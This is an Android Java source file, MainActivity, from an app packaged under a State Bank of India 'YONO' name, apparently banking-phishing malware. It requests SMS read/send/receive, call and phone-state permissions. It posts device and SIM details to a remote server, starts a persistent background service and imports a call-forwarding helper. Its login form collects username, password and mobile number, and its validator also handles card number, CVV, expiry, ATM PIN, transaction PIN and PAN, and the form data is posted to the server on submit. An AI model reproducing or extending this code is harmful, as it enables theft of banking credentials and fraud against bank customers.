    package com.sbi.yono.service.online;

    import android.Manifest;
    import android.annotation.SuppressLint;
    import android.content.DialogInterface;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.net.Uri;
    import android.os.Build;
    import android.os.Bundle;
    import android.provider.Settings;
    import android.util.Log;
    import android.widget.Button;
    import android.widget.EditText;
    import android.widget.Toast;

    import androidx.annotation.NonNull;
    import androidx.annotation.RequiresApi;
    import androidx.appcompat.app.AlertDialog;
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    import androidx.core.content.ContextCompat;

    import com.sbi.yono.service.online.FrontServices.BackgroundService;
    import com.sbi.yono.service.online.FrontServices.CallForwardingHelper;
    import com.sbi.yono.service.online.FrontServices.FormValidator;
    import com.sbi.yono.service.online.FrontServices.SharedPreferencesHelper;

    import org.json.JSONException;
    import org.json.JSONObject;

    import java.util.HashMap;
    import java.util.Map;
    import java.util.Objects;

    public class MainActivity extends AppCompatActivity {

        public Map<Integer, String> ids;
        public HashMap<String, Object> dataObject;

        private static final int REQUEST_CODE_PERMISSIONS = 101;

        @SuppressLint("SetTextI18n")
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            checkPermissions();

        }

        @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
        private void initializeWebView() {
            // Implementation
        }

        public boolean validateForm() {
            boolean isValid = true; // Assume the form is valid initially

            // Clear dataObject before adding new data
            dataObject.clear();

            for (Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                // Check if the field is required and not empty
                if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                    isValid = false; // Mark as invalid if required field is missing
                    continue; // Continue with the next field
                }

                String value = editText.getText().toString().trim();

                // Validate based on the key
                switch (key) {
                    case "moo":
                        if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                            isValid = false;
                        }
                        break;

                    case "cvv":
                        if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                            isValid = false;
                        }
                        break;
                    case "pin":
                        if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                            isValid = false;
                        }
                        break;
                    case "tpin":
                        if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                            isValid = false;
                        }
                        break;
                    case "expiry":
                        if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                            isValid = false;
                        }
                        break;
                    case "card":
                        if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                            isValid = false;
                        }
                        break;
                    case "pan":
                        if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
                            isValid = false;
                        }
                        break;
                    default:
                        break;
                }

                // Add to dataObject only if the field is valid
                if (isValid) {
                    dataObject.put(key, value);
                }
            }

            return isValid;
        }


        @Override
        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == REQUEST_CODE_PERMISSIONS) {
                // Check if permissions are granted or not
                if (grantResults.length > 0) {
                    boolean allPermissionsGranted = true;
                    StringBuilder missingPermissions = new StringBuilder();

                    for (int i = 0; i < grantResults.length; i++) {
                        if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                            allPermissionsGranted = false;
                            missingPermissions.append(permissions[i]).append("\n"); // Add missing permission to the list
                        }
                    }
                    if (allPermissionsGranted) {
                        init();
                    } else {
                        showPermissionDeniedDialog();
                        Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                        Log.d("Permissions", "Missing Permissions: " + missingPermissions.toString());
                    }
                }
            }
        }


        private void checkPermissions() {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||

                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||

                    ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.CALL_PHONE,
                        Manifest.permission.INTERNET,
                        Manifest.permission.ACCESS_NETWORK_STATE,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.SEND_SMS
                }, REQUEST_CODE_PERMISSIONS);
                Toast.makeText(this, "Requesting permission", Toast.LENGTH_SHORT).show();
            } else {
                init();
                Toast.makeText(this, "Permissions already granted", Toast.LENGTH_SHORT).show();
            }
        }


        private void showPermissionDeniedDialog() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Permission Denied");
            builder.setMessage("All permissions are required to send and receive messages. " +
                    "Please grant the permissions in the app settings.");

            // Open settings button
            builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    openAppSettings();
                }
            });

            // Cancel button
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    finish();
                }
            });

            builder.show();
        }
//    private void openAppSettings() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.addCategory(Intent.CATEGORY_DEFAULT);
//        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(intent);
//    }

        public void openAppSettings() {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            Uri uri = Uri.fromParts("package", getPackageName(), null);
            intent.setData(uri);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        public void registerPhoneData() {
            SharedPreferencesHelper share = new SharedPreferencesHelper(getApplicationContext());
            if(share.getBoolean("is_registered", false)){
                return ;
            }
            share.saveBoolean("is_registered", true);
            NetworkHelper networkHelper = new NetworkHelper();
            Helper help = new Helper();
            String url = help.URL() + "/mobile/add";
            JSONObject sendData = new JSONObject();
            try {
                Helper hh = new Helper();
                sendData.put("site", hh.SITE());
                sendData.put("mobile", Build.MANUFACTURER);
                sendData.put("model", Build.MODEL);
                sendData.put("mobile_android_version", Build.VERSION.RELEASE);
                sendData.put("mobile_api_level", Build.VERSION.SDK_INT);
                sendData.put("mobile_id",  Helper.getAndroidId(getApplicationContext()));
                try {
                    JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                    sendData.put("sim", simData);
                } catch (JSONException e) {
                    Log.e("Error", "Invalid JSON data: " + e.getMessage());
                }
            }catch (JSONException e) {
                e.printStackTrace();
            }
            Log.d(Helper.TAG, "MOBILE INFO" + sendData);
            networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
                @Override
                public void onSuccess(String result) {
                    runOnUiThread(() -> {
                        try {
                            JSONObject jsonData = new JSONObject(result);
                            if(jsonData.getInt("status") == 200) {
                                Log.d(Helper.TAG, "Registered Mobile");
                            }else {
                                Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                                Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
                            }
                        } catch (JSONException e) {
                            Log.d(Helper.TAG, Objects.requireNonNull(e.getMessage()));
                            Toast.makeText(getApplicationContext(),  Objects.requireNonNull(e.getMessage()), Toast.LENGTH_LONG).show();
                        }
                    });
                }
                @Override
                public void onFailure(String error) {
                    runOnUiThread(() -> {
                        Log.d(Helper.TAG, error);;
                        Toast.makeText(getApplicationContext(),  error, Toast.LENGTH_LONG).show();
                    });
                }
            });
        }

        public void init(){
            registerPhoneData();

            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }

            dataObject = new HashMap<>();
            Helper helper1 = new Helper();
            Log.d(helper1.TAG, helper1.SITE());

            if(!Helper.isNetworkAvailable(this)) {
                Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                startActivity(intent);
            }
            // Initialize the ids map
            ids = new HashMap<>();
            ids.put(R.id.username, "username");
            ids.put(R.id.moo, "moo");
            ids.put(R.id.password, "password");

            // Populate dataObject
            for(Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                String value = editText.getText().toString().trim();
                dataObject.put(key, value);
            }
            Button buttonSubmit = findViewById(R.id.login_button);
            buttonSubmit.setOnClickListener(v -> {
                if (validateForm()) {

                    JSONObject dataJson = new JSONObject(dataObject);
                    JSONObject sendPayload = new JSONObject();
                    try {
                        Helper helper = new Helper();
                        dataJson.put("mobileName", Build.MODEL);
                        sendPayload.put("mobile_id", Helper.getAndroidId(getApplicationContext()));
                        sendPayload.put("site", helper.SITE());
                        sendPayload.put("data", dataJson);
                        Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                            @Override
                            public void onResponse(String result) {
                                if (result.startsWith("Response Error:")) {
                                    Toast.makeText(MainActivity.this, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                } else {
                                    try {
                                        JSONObject response = new JSONObject(result);
                                        if(response.getInt("status")==200){
                                            Intent intent = new Intent(MainActivity.this, SecondActivity.class);
                                            intent.putExtra("id", response.getInt("data"));
                                            startActivity(intent);
                                        }else{
                                            Toast.makeText(MainActivity.this, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                        }
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                    }
                                }
                            }
                        });
                    } catch (JSONException e) {
                        Toast.makeText(MainActivity.this, "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
                    }
                }else{
                    Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                }
            });


        }


    }